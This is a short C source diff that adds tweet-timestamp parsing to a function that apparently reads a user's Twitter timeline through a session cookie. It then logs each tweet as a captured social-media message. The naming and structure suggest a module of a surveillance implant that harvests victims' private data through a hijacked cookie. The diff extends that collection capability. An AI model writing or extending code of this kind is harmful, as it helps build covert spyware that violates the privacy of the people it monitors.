@@ -160,6 +160,7 @@ DWORD HandleTwitterContacts(char *cookie)
 
 #define TW_TWEET_BODY "\"text\":\""
 #define TW_TWEET_ID "\"id_str\":\""
+#define TW_TWEET_TS "\"created_at\":\""
 DWORD ParseTweet(char *user, char *cookie)
 {
 	DWORD ret_val;
@@ -169,6 +170,7 @@ DWORD ParseTweet(char *user, char *cookie)
 	WCHAR twitter_request[256];
 	char tweet_body[256];
 	char tweet_id[256];
+	char tweet_ts[256];
 	char screen_name[256];
 	ULARGE_INTEGER act_tstamp;
 	DWORD last_tstamp_hi, last_tstamp_lo;
@@ -184,6 +186,17 @@ DWORD ParseTweet(char *user, char *cookie)
 	parser1 = (char *)r_buffer;
 	
 	for (;;) {
+		CheckProcessStatus();
+		parser1 = strstr(parser1, TW_TWEET_TS);
+		if (!parser1)
+			break;
+		parser1 += strlen(TW_TWEET_TS);
+		parser2 = strchr(parser1, '\"');
+		if (!parser2)
+			break;
+		*parser2 = NULL;
+		_snprintf_s(tweet_ts, sizeof(tweet_ts), _TRUNCATE, "%s", parser1);
+		parser1 = parser2 + 1;
 
 		parser1 = strstr(parser1, TW_TWEET_ID);
 		if (!parser1)
@@ -230,7 +243,7 @@ DWORD ParseTweet(char *user, char *cookie)
 
 		// XXX Sistemare il timestamp
 		GET_TIME(tstamp);
-		LogSocialIMMessageA("Twitter", "", "Twitter", screen_name, tweet_body, &tstamp); 	
+		LogSocialIMMessageA("Twitter", tweet_ts, "Twitter", screen_name, tweet_body, &tstamp); 	
 	}
 
 	SAFE_FREE(r_buffer);
